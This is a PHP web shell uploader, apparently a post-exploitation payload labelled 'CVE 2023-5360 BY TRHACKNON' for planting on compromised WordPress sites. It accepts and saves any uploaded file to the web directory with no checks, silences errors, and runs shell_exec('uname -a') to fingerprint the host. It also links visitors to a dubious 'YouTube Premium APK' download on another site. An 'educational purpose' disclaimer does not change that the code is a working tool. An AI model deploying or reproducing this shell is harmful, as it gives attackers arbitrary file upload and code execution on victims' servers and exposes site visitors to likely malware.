<?php

// PHP logic
error_reporting(0);
set_time_limit(0);

if (isset($_POST['Submit'])) {
    handleFileUpload();
} else {
    displayUploadForm();
}

function handleFileUpload() {
    $filedir = "";
    $maxfile = 2000000;
    $mode = '0644';

    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];

    if (isset($_FILES['image']['name'])) {
        $qx = $filedir . $userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod($qx, octdec($mode));

        echo "<a href=$userfile_name><center><b>Successfully Uploaded :D ==> $userfile_name</b></center></a>";
    }
}

function displayUploadForm() {
    ?>
        <style>
            body {
                background-color: #000; /* Black background */
                color: #00FFFF; /* Cyan text for higher contrast */
                font-family: 'Courier New', monospace;
            }

            h2 {
                color: #00FFFF; /* Cyan headline for contrast */
                font-size: 36px;
                text-align: center;
                text-transform: uppercase;
                letter-spacing: 2px;
                margin-bottom: 20px;
            }

            .container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }

            form {
                width: 300px;
                padding: 20px;
                background-color: #FF0000; /* Red background for the form */
                border: 1px solid #00FF00; /* Bright green border for contrast */
                border-radius: 20px;
            }

            input[type="file"] {
                background-color: #FF0000; /* Red background */
                color: #00FF00; /* Bright green text */
                border: 1px solid #00FF00; /* Bright green border */
                padding: 5px;
                margin-bottom: 10px;
                width: 100%;
                border-radius: 20px;
            }

            input[type="file"]::file-selector-button {
                background-color: #00FF00; /* Bright green background for contrast */
                color: #000;
                border: none;
                padding: 5px 10px;
                border-radius: 20px;
                cursor: pointer;
            }

            input[type="file"]:hover::file-selector-button {
                background-color: #FFFF00; /* Yellow on hover for contrast */
            }

            input[type="submit"] {
                background-color: #00FF00; /* Bright green background */
                color: #000;
                border: none;
                padding: 10px;
                width: 100%;
                border-radius: 20px;
                cursor: pointer;
            }

            input[type="submit"]:hover {
                background-color: #FFFF00; /* Yellow on hover for contrast */
            }

            .additional-text {
                text-align: center;
                margin-top: 10px;
                color: #FFD700; /* Gold text for contrast */
            }

            footer {
                text-align: center;
                margin-top: 20px;
                font-size: 14px;
                color: #00FFFF; /* Cyan text for contrast */
            }

#logo {
    max-width: 100px; /* Taille maximale du logo */
    display: block;
    margin: 0 auto;
    transform: rotate(20deg); /* Rotation du logo */
}
#funFooter {
    background-color: #222; /* Fond gris pour le pied de page */
    padding: 20px;
    text-align: center;
    color: #FF00FF; /* Couleur vive pour le texte */
}

.downloadButton {
    display: block;
    margin: 20px auto;
    padding: 15px 30px;
    background-color: #FF00FF; /* Couleur vive pour le bouton */
    color: #333; /* Couleur du texte */
    text-decoration: none;
    border-radius: 50px; /* Forme spéciale (cercle) */
    text-align: center;
    font-weight: bold;
}

.rainbowButton {
    background-image: linear-gradient(to right, violet, indigo, blue, green, yellow, orange, red); /* Couleurs arc-en-ciel */
    color: #fff; /* Couleur du texte en blanc pour contraste */
    background-size: 150% auto;
    background-position: 0 100%;
    transition: background-position 0.5s;
}

.rainbowButton:hover {
    background-position: 100% 0;
}

        .download-button:hover {
            background-color: #45a049;
        }

        .download-button:active {
            background-color: #357d3b;
        }

        .download-icon {
            display: none;
        }

        .download-button.downloading .download-icon {
            display: inline;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

#funFooter {
    background-color: #222; /* Fond gris pour le pied de page */
    padding: 20px;
    text-align: center;
    color: #FF00FF; /* Couleur vive pour le texte */
}

.funText {
    font-weight: bold;
    color: #FFFF00; /* Couleur vive pour le texte en surbrillance */
}

/* Styles pour l'alerte */
.custom-alert {
    background-color: #FFF000;
    color: #FF0000;
    padding: 10px;
    text-align: center;
    font-size: 18px;
    border: 2px solid #00FF00;
    border-radius: 10px;
    margin: 20px;
}

/* Animation pour l'alerte */
@keyframes pulse {
    0% {
        transform: scale(1);
    }
    50% {
        transform: scale(1.05);
    }
    100% {
        transform: scale(1);
    }
}

/* Applique l'animation */
.custom-alert {
    animation: pulse 2s infinite;
}
/* Ajoutez le style personnalisé pour votre fenêtre modale ici */
.modal {
    display: none;
    position: fixed;
    z-index: 1;
    color: #₣F0000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.7);
}

.modal-content {
    position: relative;
    color: #₣F0000;
    margin: 15% auto;
    padding: 20px;
    width: 50%;
    background-color: #fff000;
    border-radius: 10px;
    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
}

.close {
    position: absolute;
    top: 0;
    right: 0;
    padding: 10px;
    cursor: pointer;
}

/* Ajoutez d'autres styles personnalisés selon vos préférences */
</style>
</head>
<body>
<div class="custom-alert">
CVE 2023-5360 BY TRHACKNON
</div>  <img id="logo" src="http://static-trkn.replit.app/cup.png" alt="Mon Logo Crazy">
    <h1 class="animate__animated animate__bounce"></h1>

    <!-- Ajouter le hostname et la sortie de uname -a -->
    <p><b>Hostname:</b> <?php echo gethostname(); ?></p>
    <p><b>Uname -a:</b> <?php echo shell_exec('uname -a'); ?></p>
    <div class="container">
        <form method="POST" action="#" enctype="multipart/form-data">
            <h2><code>UPLOADER by TRHACKNON</code></h2>
            <input type="file" name="image">
            <br>
            <input type="submit" name="Submit" value="Upload">
            <p class="additional-text">THIS IS FOR EDUCATIONAL PURPOSE, I'm not responsible for your acts</p>
        </form>
        </div>
        <br><center><a href="https://harrypotter-lordfilm.ru/wp-content/uploads/wpr-addons/forms/YOUTUBE-PREM.apk" target="_blank" class="downloadButton animate__animated animate__bounce rainbowButton">Download YouTube Premium APK</a>
        <span class="download-icon">&#x2B07;</span>
    </a></center>
    <div id="customAlert" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeCustomAlert()">&times;</span>
            <p>TRHACKNON PROPERTY !</p>
            Uploader par TRHACKNON.</p>
        </div>
    </div>
<script>
window.addEventListener("load", function() {
    showCustomAlert();
});

function showCustomAlert() {
    var modal = document.getElementById("customAlert");
    modal.style.display = "block";
}

function closeCustomAlert() {
    var modal = document.getElementById("customAlert");
    modal.style.display = "none";
}
</script>
<img src="https://proximity-proxy-1.trkn.repl.co/shot.jpg" alt="Exploit Preview" style="display: block; margin: 0 auto; margin-top: 20px; max-width: 50%;" />


<footer id="funFooter">
    <p>Developed by <span class="funText">TRHACKNON</span> for educative use only.</p>
    <p>&copy; <?php echo date("Y"); ?> All rights reserved.</p>
</footer>
</body>
</html>
    <?php
}
?>